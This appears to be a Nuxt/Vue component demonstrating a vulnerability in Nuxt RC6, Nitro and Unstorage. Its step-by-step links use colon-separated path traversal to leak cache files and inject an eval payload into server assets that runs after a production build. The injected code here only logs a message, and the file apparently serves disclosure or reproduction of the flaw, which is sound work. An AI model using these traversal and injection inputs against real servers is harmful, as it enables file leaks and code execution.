<template>
  <div>
    Nuxt RC6, Nitro 0.4.12, Unstorage 0.5.5 Exploit 
    
    <ol>
      <li>
        <NuxtLink to="/api/bryce" target="_blank">Try this link, you can see my name!</NuxtLink>. If you explore the .nuxt/cache folder you'll find the cached file.
      </li>

      <li>
        <NuxtLink to="/api/..:..:..:..:..:..:public:test" target="_blank">Try this link.</NuxtLink> then <NuxtLink to="/test.json" target="_blank">this link.</NuxtLink> You've leaked a cache file!
      </li>


      <li>
        <NuxtLink to="/api/..:..:..:..:..:..:server:assets:'+eval('console.log(`hacked!`);`blah`')+'" target="_blank">Try this link.</NuxtLink> then run a production build (make sure you're on linux).
      </li>

      <li>
        Have a look at the ./output/server/chunks/nitro/node-server.mjs file. Look for "const _assets = {"
      </li>

      
      <li>
        Run your new build!
      </li>
    </ol>
  
  </div>
</template>

<script setup>
const demo = async () => {
  const { data } = await useFetch('/api/cached');
};
</script>
